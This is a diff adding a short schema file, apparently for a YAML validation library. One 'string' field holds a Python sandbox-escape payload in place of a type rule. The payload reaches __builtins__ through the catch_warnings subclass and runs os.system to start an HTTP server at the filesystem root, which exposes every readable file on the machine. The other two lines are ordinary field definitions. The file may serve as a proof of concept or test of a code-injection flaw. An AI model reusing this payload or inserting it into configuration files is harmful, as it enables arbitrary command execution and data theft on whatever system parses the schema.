@@ -1,0 +1,3 @@
+string: "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python3 -m http.server'))"
+number: num(required=False)
+datetime: timestamp(min='2010-01-01 0:0:0')
